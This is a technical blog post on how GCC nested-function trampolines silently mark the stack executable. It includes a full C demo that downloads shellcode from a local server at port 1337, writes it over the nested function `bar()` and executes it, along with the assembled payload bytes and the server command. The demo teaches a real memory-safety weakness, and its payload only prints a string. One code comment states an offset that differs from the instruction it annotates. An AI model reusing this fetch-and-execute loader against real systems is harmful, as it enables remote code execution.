---
title: gcc Silent Trampoline Execstack Abuse
date: 2022-02-19 09:00:00
tags:
    - linux
    - gcc
    - xoreaxeax
category: tech
keywords:
    - execstack abuse
---

# author:[[xoreaxeax]](https://github.com/x0reaxeax)

Danger by design of GNU's GCC nested functions raises from use of trampolines - small pieces of code used to implement pointers to nested functions.  
These trampolines are created on stack, meaning the stack needs to be marked as executable for nested functions to be executed - the nested function pointer is after all the address of the trampoline itself.  
Executable stack is heavily frowned upon on modern systems. In this case however, the bigger problem arises from the stack being set to `RWE` (Read/Write/Execute) **silently**, without any warning message during compilation and linking.  
Although GCC offers a warning flag - `-Wtrampolines`, to warn about any generated trampolines, the warning is not enabled by default, which can lead to nasty consequences.  
To be more specific, it allows for executable code to be rewritten during runtime.  

We can see the `RWE` flag in the output of GNU binutils' `readelf(1)`:
```c
$ readelf -l ./a.out
Program Headers:
  Type           Offset             VirtAddr           PhysAddr
                 FileSiz            MemSiz              Flags  Align
  ... 
  GNU_STACK      0x0000000000000000 0x0000000000000000 0x0000000000000000
                 0x0000000000000000 0x0000000000000000  RWE    0x10
  ... 
```

This demo shows a simple abuse of this mechanism by defining a nested function `bar()`,  
which **defined** purpose is to prompt end user for their name and greet them.  
This function however, thanks to the consequential use of stack trampolines,  
will be rewritten and completely altered by a shellcode payload fetched from a remote location.  
After the function opcodes are successfully rewritten, the nested function will be called from outside of it's enclosing function's scope.  
We can refer to [GCC manual - 6.4 Nested Functions](https://gcc.gnu.org/onlinedocs/gcc/Nested-Functions.html), which reminds us this may not be the best idea:  

*"If you try to call the nested function through its address after the containing function exits, all hell breaks loose."*

Even though this example assumes complete control over source code, executable stack can be identically abused in already compiled binaries,
if another vulnerability in code offers an entry point for arbitrary memory write.  

To clarify, this demo does not go into detail on how nested functions and trampolines actually work, 
instead, it points at the **seemingly** irrelevant consequences of using these GCC extensions.

The following code will represent the enclosing and nested function in our demo:
```c
void* foo(void) {
    /* harmless nested function `bar()` */
    int bar(void) { 
        char name_buf[256] = { 0 };
        puts("I'm a harmless function!\n");
        puts("Please tell me your name!\n");
        printf("Your name: ");
        fflush(stdout);
        fgets(name_buf, 255, stdin);
        name_buf[strcspn(name_buf, "\0")] = 0;
        printf("Hi %s!\n", name_buf);

        return 0; 
    }
    
    /* exposes the address of nested function outside of it's local scope */
    return bar;
}
```

The nested function will be executed using the the following `exec()` function: 
```c
/* the argument passed as to `exec()` is the address of nested function `bar()` */
void __attribute__ ((__naked__)) exec(void (*func)()) {
    __asm__ volatile ( 
            ".intel_syntax noprefix;"
            "call rdi;" /* the function's address will be passed in RDI register, *
                         * so we can directly call it                             */
            ".att_syntax;"
            ::          /* no output/input operands */
            : "rdi"     /* rdi register clobber */
    );
}
```

Next, this simple implementation of network communication by the help of Linux sockets will be utilized for retrieving the shellcode from a remote source:

```c
#define FD_INVALID -1

int fetch_bytes(const char *destip, uint16_t destport, byte *outbuf, size_t bufsiz) {
    if (NULL == outbuf || 0 == bufsiz) {
        return EXIT_FAILURE;
    }

    int ret_code = EXIT_SUCCESS;
    char reply_buf[512] = { 0 };    /* will store unformatted fetched remote data */
    char *payload_ptr = NULL;       /* points to the beginning of actual shellcode */
    const char request[] =
            "GET /payload\r\n\r\n"; /* the shellcode resides in remote file named `payload` */
    
    int sockfd = FD_INVALID;
    size_t recvlen = 0;
    struct sockaddr_in remote;

    sockfd = socket(AF_INET, SOCK_STREAM, 0);

    if (sockfd < 0) {
        return EXIT_FAILURE;
    }
    
    remote.sin_addr.s_addr = inet_addr(destip);
    remote.sin_family = AF_INET;
    remote.sin_port = htons(destport);

    if (connect(sockfd, (const struct sockaddr *) &remote, sizeof(remote)) < EXIT_SUCCESS) {
        ret_code = EXIT_FAILURE;
        goto _FINAL;
    } 
    
    if (sendto(sockfd, request, strlen(request), 0, NULL, 0) < EXIT_SUCCESS) {
        ret_code = EXIT_FAILURE;
        goto _FINAL;
    }

    if (recv(sockfd, reply_buf, 512, 0) < EXIT_SUCCESS) {
        ret_code = EXIT_FAILURE;
        goto _FINAL;
    }

    /**
     * "verify" if shellcode has been successfully received
     * by looking for the specific byte `0xcc`.
     * this byte is only used to mark the start of the shellcode and 
     * will be actually omitted from it.
     * if the byte is not present in the fetched data, abort.
    */ 
    payload_ptr = strchr(reply_buf, 0xcc);

    if (NULL == payload_ptr) {
        ret_code = EXIT_FAILURE;
        goto _FINAL;
    }

    /* copy the shellcode to output buffer */
    memcpy(outbuf, payload_ptr + 1, bufsiz);

_FINAL:
    /* cleanup */
    shutdown(sockfd, SHUT_RDWR);
    close(sockfd);
    return ret_code;
}
```

Now it's time to craft the actual payload and setup a server for remotely accessing it.  
The payload's duty in this case is quite simple - output the string "viruz" to the console (`STDOUT`) and trigger a trap to debugger (breakpoint).  
The handy [Online x86 / x64 Assembler and Disassembler](https://defuse.ca/online-x86-assembler.htm) will help with constructing the payload and converting it into opcode bytes:
```asm
push    rdi         ; the RDI register still holds the value of nested function `bar()`
xor     eax, eax    ; clear eax ..
xor     edi, edi    ; .. and edi..
xor     edx, edx    ; .... and edx
                    ; eax = syscall number
                    ; edi = file descriptor number
                    ; rsi = (char *) buf - output string
                    ; edx = strlen(buf)
inc     eax         ; 1 == sys_write syscall
inc     edi         ; set edi to 1, since STDOUT_FILENO == 1
pop     rsi         ; pop the address of `bar()` into rsi - 
                    ;   this will be used to get address of output string,
                    ;   which is located at the end of the payload
add     rsi, 0x10   ; add offset 22 (0x16) to the address of `bar()`,
                    ;   so it points to the output string.
                    ;   this offset can be easily determined from assembled bytes
add     edx, 0x6    ; strlen
syscall
int3                ; trap to debugger (breakpoint)

                    ; output string bytes start here
db      'v'
db      'i'
db      'r'
db      'u'
db      'z'
db      0xa         ; newline
```

The final assembled payload bytes will look like this:
```c
"\x57\x31\xC0\x31\xFF\x31\xD2\xFF\xC0\xFF\xC7\x5E\x48\x83\xC6\x10\x83\xC2\x06\x0F\x05\xCC\x76\x69\x72\x75\x7a\x0a\x00"
```

The function `fetch_bytes()` will identify the payload by locating it's pre-set starting byte `0xcc`.  
Let's insert the starting byte at the beginning and store the whole payload in a file named `payload`:
```sh
$ printf "\xcc\x57\x31\xC0\x31\xFF\x31\xD2\xFF\xC0\xFF\xC7\x5E\x48\x83\xC6\x10\x83\xC2\x06\x0F\x05\xCC\x76\x69\x72\x75\x7a\x0a\x00" > payload
```

Now that the size of the payload is known, `bar()`'s opcodes can be rewritten with payload bytes:
```c
#define PAYLOAD_SIZE 31

int main(void) {
    size_t i = 0;
    byte outbuf[PAYLOAD_SIZE] = { 0 };  /* used to store the payload */

    /* fetch payload from remote - 127.0.0.1:1337 */
    if (fetch_bytes("127.0.0.1", 1337, outbuf, PAYLOAD_SIZE) != EXIT_SUCCESS) {
        return EXIT_FAILURE;
    }

    /* fetch the address of nested function `bar()` */
    byte *ptr = foo();

    /* rewrite the nested function with payload bytes */
    for (i = 0; i < PAYLOAD_SIZE;  i++) {
        *(ptr + i) = outbuf[i]; 
    }

    /* finally, execute the payload */
    exec((void (*)()) ptr);

    return EXIT_SUCCESS;
}
```

The demo is finally ready, let's setup a remote server in the same folder where `payload` file is located:
```sh
$ sudo php -S 127.0.0.1:1337 -t .
```

And finally compile and execute the completed code:
```sh
$ gcc demo.c
$ ./a.out
viruz
Trace/Breakpoint trap
```

The binary rewrote it's own code during runtime and instead of prompting the user for their name, the remote payload was executed.

**Final code:**
```c
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <unistd.h>
#include <stdlib.h>
#include <string.h>
#include <stdio.h>

#define FD_INVALID      -1
#define PAYLOAD_SIZE    31

typedef unsigned char byte;

int fetch_bytes(const char *destip, uint16_t destport, byte *outbuf, size_t bufsiz) {
    if (NULL == outbuf || 0 == bufsiz) {
        return EXIT_FAILURE;
    }

    int ret_code = EXIT_SUCCESS;
    char reply_buf[512] = { 0 };
    char *payload_ptr = NULL;
    const char request[] = "GET /payload\r\n\r\n";
    
    int sockfd = FD_INVALID;
    size_t recvlen = 0;
    struct sockaddr_in remote;

    sockfd = socket(AF_INET, SOCK_STREAM, 0);

    if (sockfd < 0) {
        return EXIT_FAILURE;
    }
    
    remote.sin_addr.s_addr = inet_addr(destip);
    remote.sin_family = AF_INET;
    remote.sin_port = htons(destport);

    if (connect(sockfd, (const struct sockaddr *) &remote, sizeof(remote)) < EXIT_SUCCESS) {
        ret_code = EXIT_FAILURE;
        goto _FINAL;
    } 
    
    if (sendto(sockfd, request, strlen(request), 0, NULL, 0) < EXIT_SUCCESS) {
        ret_code = EXIT_FAILURE;
        goto _FINAL;
    }

    if (recv(sockfd, reply_buf, 512, 0) < EXIT_SUCCESS) {
        ret_code = EXIT_FAILURE;
        goto _FINAL;
    }

    payload_ptr = strchr(reply_buf, 0xcc);

    if (NULL == payload_ptr) {
        ret_code = EXIT_FAILURE;
        goto _FINAL;
    }

    memcpy(outbuf, payload_ptr + 1, bufsiz);

_FINAL:
    shutdown(sockfd, SHUT_RDWR);
    close(sockfd);
    return ret_code;
}

void __attribute__ ((__naked__)) exec(void (*func)()) {
    __asm__ volatile (  ".intel_syntax noprefix;"
                        "call rdi;"
                        ".att_syntax;"
                        ::: "rdi"
    );
}

void* foo(void) {
    int bar(void) { 
        char name_buf[256] = { 0 };
        printf("I'm a harmless function!\n");
        printf("Please tell me your name!\n");
        printf("Your name: ");
        fflush(stdout);
        fgets(name_buf, 255, stdin);
        name_buf[strcspn(name_buf, "\0")] = 0;
        printf("Hi %s!\n", name_buf);

        return 0; 
    }
    
    return bar;
}

int main(void) {
    size_t i = 0;
    byte outbuf[PAYLOAD_SIZE] = { 0 };

    if (fetch_bytes("127.0.0.1", 1337, outbuf, PAYLOAD_SIZE) != EXIT_SUCCESS) {
        return EXIT_FAILURE;
    }

    byte *ptr = foo();

    for (i = 0; i < PAYLOAD_SIZE;  i++) {
        *(ptr + i) = outbuf[i]; 
    }

    exec((void (*)()) ptr);

    return EXIT_SUCCESS;
}
```